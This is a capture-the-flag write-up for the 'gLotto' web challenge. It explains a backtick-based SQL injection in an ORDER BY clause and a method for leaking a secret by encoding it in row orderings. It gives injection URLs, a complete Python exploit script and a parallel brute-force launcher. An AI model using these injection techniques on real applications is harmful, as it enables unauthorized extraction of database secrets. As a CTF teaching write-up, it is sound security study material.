# gLotto
22 solves, 288 points

> Are you lucky?
> https://glotto.web.ctfcompetition.com/

## Analysis

The link goes to a "lottery" website, with tables of past winning tickets and an option to check your ticket. At the bottom of the page, there is a link to show the source.

We can see that the flag is given if you submit the winning ticket:
```php
if ($_POST['code'] === $win)
{
    die("You won! $flag");
} else {
    sleep(5);
    die("You didn't win :(<br>The winning ticket was $win");
}
```

Additionally, a new winning ticket is randomly generated on every request to the home page, and the winning ticket is unset on checking a ticket, preventing you from just submitting the winning ticket without visiting the home page again.

The application also lets you sort each table by a key in a query parameter:
```php
for ($i = 0; $i < count($tables); $i++)
{
    $order = isset($_GET["order{$i}"]) ? $_GET["order{$i}"] : '';
    if (stripos($order, 'benchmark') !== false) die;
    ${"result$i"} = $db->query("SELECT * FROM {$tables[$i]} " . ($order != '' ? "ORDER BY `".$db->escape_string($order)."`" : ""));
    if (!${"result$i"}) die;
}
```

The [documentation](https://www.php.net/manual/en/mysqli.real-escape-string.php) for `mysql::escape_string` lists the characters encoded:

> Characters encoded are NUL (ASCII 0), \n, \r, \, ', ", and Control-Z.

Notice that backticks are not on this list, so ```"ORDER BY `".$db->escape_string($order)."`"``` is vulnerable to SQL injection. Here is a very basic proof that this works:

```
https://glotto.web.ctfcompetition.com/?order0=winner`%20--%20
```

This URL sorts the March table by the `winner` column, since it results in the following query:

```sql
SELECT * FROM march ORDER BY `winner` -- `
```

The `--` comments out the extra backtick to prevent a syntax error.

At this point, it's also important to note that the winning ticket is assigned to an SQL variable that is never used again:
```php
$db->query("SET @lotto = '$winner'");
```

Interesting...

So, what can we do with the SQL injection? Well, the answer turns out to be "not much." The [MySQL documentation](https://dev.mysql.com/doc/refman/8.0/en/select.html) shows the valid syntax for a `SELECT` statement:

```sql
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
    [HAVING where_condition]
    [WINDOW window_name AS (window_spec)
        [, window_name AS (window_spec)] ...]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR {UPDATE | SHARE} [OF tbl_name [, tbl_name] ...] [NOWAIT | SKIP LOCKED] 
      | LOCK IN SHARE MODE]]
```

Our injection is after `ORDER BY`, so the only fields we control are `ORDER BY`, `LIMIT`, `INTO`, and `FOR`. `INTO` and `FOR` are both pretty much useless for conveying information. `LIMIT` cannot be an expression, so it can't be used for sending data. That leaves the `ORDER BY` clause.

Since we have to specify a valid column for the first `ORDER BY`, and each column has unique values, it seems like we won't be able to control the ordering. However, we can add on to the expression to make it always return the same value and force it to use the secondary sort column. I chose to use `IS NOT NULL`. With this, we can sort by an arbitrary value. Let's try just sorting randomly:

```
https://glotto.web.ctfcompetition.com/?order0=winner`%20IS%20NOT%20NULL,%20RAND()%20--%20
```

This gives the following query:

```sql
SELECT * FROM march ORDER BY `winner` IS NOT NULL, RAND() -- `
```

As expected, the March table is ordered differently each time we visit the page.

## Exploitation

So we have complete control over the ordering. Is this enough to transmit the entire winning ticket? Let's look at the `gen_winner` function:

```php
function gen_winner($count, $charset='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
{
    $len = strlen($charset);
    $rand = openssl_random_pseudo_bytes($count);
    $secret = '';

    for ($i = 0; $i < $count; $i++)
    {
        $secret .= $charset[ord($rand[$i]) % $len];
    }
    return $secret;
}
```

And how it is called:

```php
$winner = gen_winner(12);
```

This is essentially a 12 digit base36 number, so there are `36**12` possible tickets:
```python
>>> 36**12
4738381338321616896
```

We are able to sort 4 different tables, of lengths 9, 8, 7, and 4. If we make the meaning of the ordering of each table depend on the ordering of the previous tables, we can calculate the number of possible "messages":

```python
>>> fac(9)*fac(8)*fac(7)*fac(4)
1769804660736000
```

This means we can narrow it down to about 2,677 possible tickets:

```python
>>> 4738381338321616896/1769804660736000
2677.3470787172014
```

Since there is a `sleep(5)` when checking a ticket, each check takes a little over 5 seconds. If we parallelize our solution script, it is definitely possible to brute force \~2.7k in a reasonable amount of time (i.e. less than an hour).

### Encoding

We need to figure out how to encode information in the tables. A table of size `n` has `n!` permutations, so it can encode `n!` numbers based on ordering.

Let the default ordering of the table be `order[0, 1, 2, ... n]`. In order to encode a number `x` within the interval `[0, n!)`, first divide the interval into `n` subintervals: `[0, (n-1)!), [(n-1)!, 2*(n-1)!), ..., [(n-1)*(n-1)!, n*(n-1)!)`. If `x` lies within interval `i`, the new ordering begins with `order[i]`. Repeat within that interval, this time dividing into `n-1` subintervals. Of course, `order[i]` must be removed since it was already used; `n-1` elements remain.

Python implementations of encoding and decoding are given below:

```python
def encode(x, n):
  rows = list(range(n))
  order = []
  for i in range(n-1, -1, -1):
    order.append(rows.pop(x//fac(i)))
    x %= fac(i)
  return tuple(order)

def decode(order, n):
  order = list(order)
  rows = list(range(n))
  x = 0
  for i in range(n-1, -1, -1):
    j = rows.index(order.pop(0))
    x += j*fac(i)
    rows.pop(j)
  return x
```

The encoding function needs to be implemented in SQL. This seems hard at first since it uses a mutable array and pops indices from it, and we can only use simple SQL expressions. While it may be _possible_ to generate a bunch of `CASE` statements that give a single expression for transposing each position, it would also be incredibly long, and the web server has limits on how long the query string can be (which we encounter a little bit later).

However, a couple observations make this conversion a little bit easier:

1. Subqueries can be used to make "variables"
2. MySQL has support for a [JSON data type](https://dev.mysql.com/doc/refman/8.0/en/json.html)

To do incremental calculations that reuse previous ones, we can stack subqueries like so:

```sql
(SELECT c+1 as d FROM (SELECT b+1 as c FROM (SELECT a+1 as b FROM...
```

The important thing is that this allows us to reuse a previous calculation in multiple future calculations without retyping the entire expression. Another thing to note here is that we don't have any variables/state, just composition of functions (subqueries). This might remind you a little bit of lambda calculus.

In the Python implementation of `encode`, there are basically three pieces of state: `rows`, `order`, and `x`. `rows` is the remaining rows that have not been transposed. `order` is the output of the function (the map for transposition). `x` is the number to encode, modded by the interval size at each step. MySQL's JSON type can represent arrays, so that will be used for `rows` and `order`.

When sending a request to the server, the table sizes are predetermined, so anything depending on that can be hardcoded into the SQL query. We will implement a Python function that generates an SQL query to reorder a table of size `n` such that it extracts a number represented by the expression `expr`. The conditions that represent the original row order will be given in the array `m`:

```python
def sqlencode(expr, n, m):
```

The initial state of the encoding can be set with the following subquery (curly braces are used for formatting the string):

```sql
SELECT {expr} as s{n}, JSON_ARRAY({','.join(str(i) for i in range(n))}) as r{n}, JSON_ARRAY(0) as o{n}, CONCAT(CHAR(36), CHAR(91), CHAR(65), CHAR(93)) as h) AS t{n}
```

`x` is represented by `s{n}`, `rows` is represented by `r{n}`, and `order` is represented by `o{n}`. The `JSON_ARRAY` is initialized with a single element because on my local version of MariaDB, it turned into an empty string otherwise. It is not required against the server. `h` is a helper string, `'$[A]'`, that allows for a `REPLACE` to be used instead of reconstructing the entire JSON identifier each time. Without this optimization, the query ends up being too long and the web server rejects it. `CONCAT` and `CHAR` are used since single and double quotes are escaped in the PHP before being put in the query.

Subqueries are then added to the outside for each iteration of the loop in the Python implementation. These are of the format:

```sql
SELECT h, JSON_ARRAY_APPEND(o{i+1}, CONVERT(CHAR(36) USING utf8mb4), JSON_EXTRACT(r{i+1}, REPLACE(h,CHAR(65), CONVERT(s{i+1} DIV {fac(i)},char)))) as o{i},  MOD(s{i+1}, {fac(i)}) as s{i}, JSON_REMOVE(r{i+1}, REPLACE(h, CHAR(65), CONVERT(s{i+1} DIV {fac(i)},char))) AS r{i} FROM {subquery}) AS t{i}
```

`h` is selected so it can be used in the next query as well. `JSON_ARRAY_APPEND` is used to add the element at index `floor(x/(i!))` of `rows` to `order`. `CHAR(36)` is just `$`, which signifies the entire JSON array. It needs to be converted to `utf8mb4` because `JSON_ARRAY_APPEND` rejects binary encoding. `x` is calculated as the previous `x` mod `i!`, and `rows` has the element at index `floor(x/(i!))` removed. `REPLACE` is used to replace the `A` in `$[A]` with the proper index.

Now that the output array is calculated, the rows need to be sorted correctly. A `CASE` statement is constructed based on the array of conditions, `m`, to order the rows, and a final query is constructed. The full function can be seen below:

```python
def sqlencode(expr, n, m):
  query = f"(SELECT {expr} as s{n},JSON_ARRAY({','.join(str(i)for i in range(n))}) as r{n},JSON_ARRAY(0) as o{n},CONCAT(CHAR(36),CHAR(91),CHAR(65),CHAR(93)) as h) AS t{n}"
  for i in range(n-1, -1, -1):
    query = f"(SELECT h,JSON_ARRAY_APPEND(o{i+1}, CONVERT(CHAR(36) USING utf8mb4), JSON_EXTRACT(r{i+1},REPLACE(h,CHAR(65),CONVERT(s{i+1} DIV {fac(i)},char)))) as o{i}, MOD(s{i+1}, {fac(i)}) as s{i}, JSON_REMOVE(r{i+1}, REPLACE(h,CHAR(65),CONVERT(s{i+1} DIV {fac(i)},char))) AS r{i} FROM " + query + f") AS t{i}"
  jsonquery = "JSON_EXTRACT(o0,CONCAT(CHAR(36),CHAR(91),CONVERT({index},char),CHAR(93)))"
  cases = "CASE"
  for i in range(len(m)):
    cases += f" WHEN {m[i]} THEN {jsonquery.format(index=i+1)}"
  cases += " ELSE NULL END"
  query = "(SELECT " + cases + " FROM " + query + ")"
  return query
```

To decode a number retrieved from the server, we figure out which row was moved where and plug an array of that into the `decode` function:

```python
def sqldecode(r, n, m):
  s = sorted(list(map(lambda x:(r.index(x), x), m)), key=lambda x:x[0])
  encoded = []
  for t in m:
    encoded.append([i[1] for i in s].index(t))
  encoded = tuple(encoded)
  return decode(encoded, n)
```

`r` is the server response, `n` is the number of rows, and `m` is an array the of tickets in their original order.

### Exfiltration

We can now transmit 4 numbers in the ranges `[0,9!)`, `[0,8!)`, `[0,7!)`, and `[0,4!)`. To get the possibilities for the winning lottery ticket, we convert it to a base36 number and use each table to get a range of possible values.

We want to divide the number so that it fits in the range of the first table, `[0,8!)`. The maximum value is `36**12 - 1` (`ZZZZZZZZZZZZ`), so we take that and divide it by `8!`:

```python
>>> ceil((36**12 - 1)/fac(8))
117519378430596
```

Our first piece of data we get is which interval of size 117519378430596 the winning ticket lies in. We then take the winning number modulo 117519378430596, and split that into intervals that give indices up to the size of our next table, `9!`. This process is repeated for each table until we narrow it down to 2,677 values and guess one of them.

A couple helper functions are defined to construct the queries and URL parameters:

```python
param = lambda q: f"winner` IS NOT NULL, {q} -- "
num = lambda m1,m2,m3,d: f"(MOD(MOD(MOD(CAST(CONV(@lotto, 36, 10) AS UNSIGNED), {m1}),{m2}),{m3}) DIV {d})"
```

And we make a guess and hopefully get the flag:

```python
rs = requests.session()
r = rs.get(url, params={
    "order0": param(sqlencode(num(36**12, 36**12, 36**12, 117519378430596), 8, march)),
    "order1": param(sqlencode(num(36**12, 36**12, 117519378430596, 323851903), 9, april)),
    "order2": param(sqlencode(num(36**12, 117519378430596, 323851903, 64257), 7, may)),
    "order3": param(sqlencode(num(117519378430596, 323851903, 64257, 2678), 4, june))
})
r1 = sqldecode(r.text, 8, marcht)
r2 = sqldecode(r.text, 9, aprilt)
r3 = sqldecode(r.text, 7, mayt)
r4 = sqldecode(r.text, 4, junet)
guess = 117519378430596*r1 + 323851903*r2 + 64257*r3 + 2678*r4 + 100
r = rs.post(url, data={"code":base36encode(guess).zfill(12)})
if "CTF" in r.text:
    print(r.text)
```

The full solution script:

```python
from math import factorial as fac

def base36encode(integer):
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    
    sign = '-' if integer < 0 else ''
    integer = abs(integer)
    result = ''
    
    while integer > 0:
        integer, remainder = divmod(integer, 36)
        result = chars[remainder]+result

    return sign+result

def encode(x, n):
  rows = list(range(n))
  order = []

  for i in range(n-1, -1, -1):
    order.append(rows.pop(x//fac(i)))
    x %= fac(i)
  return tuple(order)

def decode(order, n):
  order = list(order)
  rows = list(range(n))
  x = 0
  for i in range(n-1, -1, -1):
    j = rows.index(order.pop(0))
    x += j*fac(i)
    rows.pop(j)
  return x

def sqlencode(expr, n, m):
  query = f"(SELECT {expr} as s{n},JSON_ARRAY({','.join(str(i)for i in range(n))}) as r{n},JSON_ARRAY(0) as o{n},CONCAT(CHAR(36),CHAR(91),CHAR(65),CHAR(93)) as h) AS t{n}"
  for i in range(n-1, -1, -1):
    query = f"(SELECT h,JSON_ARRAY_APPEND(o{i+1}, CONVERT(CHAR(36) USING utf8mb4), JSON_EXTRACT(r{i+1},REPLACE(h,CHAR(65),CONVERT(s{i+1} DIV {fac(i)},char)))) as o{i}, MOD(s{i+1}, {fac(i)}) as s{i}, JSON_REMOVE(r{i+1}, REPLACE(h,CHAR(65),CONVERT(s{i+1} DIV {fac(i)},char))) AS r{i} FROM " + query + f") AS t{i}"
  jsonquery = "JSON_EXTRACT(o0,CONCAT(CHAR(36),CHAR(91),CONVERT({index},char),CHAR(93)))"
  cases = "CASE"
  for i in range(len(m)):
    cases += f" WHEN {m[i]} THEN {jsonquery.format(index=i+1)}"
  cases += " ELSE NULL END"
  query = "(SELECT " + cases + " FROM " + query + ")"
  return query

def sqldecode(r, n, m):
  s = sorted(list(map(lambda x:(r.index(x), x), m)), key=lambda x:x[0])
  encoded = []
  for t in m:
    encoded.append([i[1] for i in s].index(t))
  encoded = tuple(encoded)
  return decode(encoded, n)

march = ["INSTR(winner,CHAR("+str(ord("C"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("1"))+"))=2",
         "INSTR(winner,CHAR("+str(ord("1"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("U"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("Y"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("H"))+"))=3",
         "INSTR(winner,CHAR("+str(ord("D"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("I"))+"))=1"]
marcht = ["CA5G8VIB6UC9", "01VJNN9RHJAC", "1WSNL48OLSAJ", "UN683EI26G56", "YYKCXJKAK3KV", "00HE2T21U15H", "D5VBHEDB9YGF", "I6I8UV5Q64L0"]

april = ["INSTR(winner,CHAR("+str(ord("4"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("7"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("U"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("O"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("2"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("L"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("8"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("B"))+"))=1",
         "INSTR(winner,CHAR("+str(ord("3"))+"))=1"]
aprilt = ["4KYEC00RC5BZ", "7AET1KPGKUG4", "UDT5LEWRSWM9", "OQQRH90KDJH1", "2JTBMJW9HZOO", "L4CY1JMRBEAW", "8DKYRPIO4QUW", "BFWQCWYK9VHJ", "31OSKU57KV49"]

may = ["INSTR(winner,CHAR("+str(ord("3"))+"))=2",
       "INSTR(winner,CHAR("+str(ord("P"))+"))=1",
       "INSTR(winner,CHAR("+str(ord("W"))+"))=2",
       "INSTR(winner,CHAR("+str(ord("M"))+"))=2",
       "INSTR(winner,CHAR("+str(ord("K"))+"))=1",
       "INSTR(winner,CHAR("+str(ord("Z"))+"))=1",
       "INSTR(winner,CHAR("+str(ord("8"))+"))=1"]
mayt = ["O3QZ2P6JNSSA", "PQ8ZW6TI1JH7", "OWGVFW0XPLHE", "OMZRJWA7WWBC", "KRRNDWFFIB08", "ZJR7ANXVBLEF", "8GAB09Z4Q88A"]

june = ["INSTR(winner,CHAR("+str(ord("1"))+"))=1",
        "INSTR(winner,CHAR("+str(ord("Y"))+"))=1",
        "INSTR(winner,CHAR("+str(ord("W"))+"))=1",
        "INSTR(winner,CHAR("+str(ord("G"))+"))=1"]
junet = ["1JJL716ATSCZ", "YELDF36F4TW7", "WXRJP8D4KKJQ", "G0O9L3XPS3IR"]

param = lambda q: f"winner` IS NOT NULL, {q} -- "
num = lambda m1,m2,m3,d: f"(MOD(MOD(MOD(CAST(CONV(@lotto, 36, 10) AS UNSIGNED), {m1}),{m2}),{m3}) DIV {d})"

import requests
url = "https://glotto.web.ctfcompetition.com"

while True:
  rs = requests.session()
  r = rs.get(url, params={
    "order0": param(sqlencode(num(36**12, 36**12, 36**12, 117519378430596), 8, march)),
    "order1": param(sqlencode(num(36**12, 36**12, 117519378430596, 323851903), 9, april)),
    "order2": param(sqlencode(num(36**12, 117519378430596, 323851903, 64257), 7, may)),
    "order3": param(sqlencode(num(117519378430596, 323851903, 64257, 2678), 4, june))
  })
  r1 = sqldecode(r.text, 8, marcht)
  r2 = sqldecode(r.text, 9, aprilt)
  r3 = sqldecode(r.text, 7, mayt)
  r4 = sqldecode(r.text, 4, junet)
  guess = 117519378430596*r1 + 323851903*r2 + 64257*r3 + 2678*r4 + 100
  r = rs.post(url, data={"code":base36encode(guess).zfill(12)})
  if "CTF" in r.text:
    print(r.text)
    break
  win = int(r.text.split(" ")[-1], 36)
  print(guess - win, r.text.split(" ")[-1], base36encode(guess).zfill(12))
```

And the code used to parallelize it:

```python
import os, sys

for i in range(10):
  os.system("python3 lotto.py &")

while True:
  try:
    pass
  except BaseException:
    os.system("pkill -f lotto.py")
    sys.exit(0)
```

After running this for a bit, the flag pops out:

```
CTF{3c2ca0d10a5d4bf44bc716d669e074b2}
```
